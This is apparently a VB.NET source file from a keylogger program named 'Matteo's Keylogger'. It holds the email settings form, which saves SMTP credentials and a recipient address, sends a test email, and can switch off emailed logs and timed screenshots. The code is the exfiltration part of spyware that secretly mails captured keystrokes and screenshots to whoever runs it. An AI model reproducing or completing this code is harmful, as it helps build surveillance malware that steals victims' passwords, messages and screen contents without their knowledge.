Imports System.Web
Imports System.IO
Imports System.Net.Mail
Public Class email

    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click

        If TextBox1.Text = Nothing Then
            MsgBox("Please enter in your email", MsgBoxStyle.Exclamation)
        Else
            If TextBox1.Text.Contains("@") = False Or TextBox1.Text.Contains(".") = False Then
                MsgBox("That is not a valid email. ", MsgBoxStyle.Critical)
            Else

                Try
                    My.Settings.email = TextBox1.Text
                    My.Settings.gmusername = TextBox2.Text
                    My.Settings.gmpassword = TextBox3.Text
                    My.Settings.Save()

                    MsgBox("Your email has been set. All logs will be sent to this address.", MsgBoxStyle.Information)
                    Me.Close()
                Catch ex As Exception
                    MsgBox("An error occured while saving your email :(", MsgBoxStyle.Critical)
                End Try
            End If
        End If

    End Sub

    Private Sub email_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        TextBox1.Text = My.Settings.email
        TextBox2.Text = My.Settings.gmusername
        TextBox3.Text = My.Settings.gmpassword
    End Sub

    Private Sub Button2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button2.Click
        Me.Close()
    End Sub

    Private Sub Button3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button3.Click
        Try
            Cursor.Current = Cursors.WaitCursor
            My.Settings.email = TextBox1.Text
            My.Settings.gmusername = TextBox2.Text
            My.Settings.gmpassword = TextBox3.Text
            Dim mail As New MailMessage()
            Dim SmtpServer As New SmtpClient
            SmtpServer.Credentials = New Net.NetworkCredential(My.Settings.gmusername, My.Settings.gmpassword)
            SmtpServer.Port = My.Settings.smtpport
            SmtpServer.Host = My.Settings.smtpserver

            SmtpServer.EnableSsl = My.Settings.enablessl
            mail.To.Add(My.Settings.email)
            mail.From = New MailAddress("keyloggertest@keylogger.com")
            mail.Subject = "Test"
            mail.Body = "Hello , this is a test email for Matteo's Keylogger. "
            SmtpServer.Send(mail)
            Cursor.Current = Cursors.Default
            MsgBox("Email has been sent!", MsgBoxStyle.Information)

        Catch se As SmtpException
            MsgBox(se.Message, MsgBoxStyle.Critical)
            Cursor.Current = Cursors.Default
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Critical)
        End Try
    End Sub

    Private Sub LinkLabel1_LinkClicked(sender As System.Object, e As System.Windows.Forms.LinkLabelLinkClickedEventArgs) Handles LinkLabel1.LinkClicked
        If MsgBox("Do you really want to erase your email? You will not be able to have the logs or screenshots emailed to you. ", MsgBoxStyle.YesNo) = Windows.Forms.DialogResult.Yes Then
            Try
                My.Settings.email = Nothing
                My.Settings.gmpassword = Nothing
                My.Settings.gmusername = Nothing
                My.Settings.Save()
                screenshotsettings.picturetimer.Stop()
                screenshotsettings.CheckBox5.Checked = False
                My.Settings.takescreenshot = False
                screenshotsettings.CheckBox6.Checked = False
                screenshotsettings.ComboBox1.Enabled = False
                screenshotsettings.NumericUpDown1.Enabled = False
                Form1.CheckBox6.Checked = False
                Form1.CheckBox12.Checked = False
                My.Settings.sendemailatlaunch = False
                My.Settings.autoemail = False
                Form1.NumericUpDown1.Enabled = False
                Form1.Timer2.Stop()
                MsgBox("Email was reset.", MsgBoxStyle.Information)
                Me.Close()
            Catch ex As Exception
                MsgBox(ex.Message, MsgBoxStyle.Critical)
            End Try
        Else

        End If

    End Sub

    Private Sub Button4_Click(sender As System.Object, e As System.EventArgs) Handles Button4.Click
        advancedemailsettings.Show()
    End Sub
End Class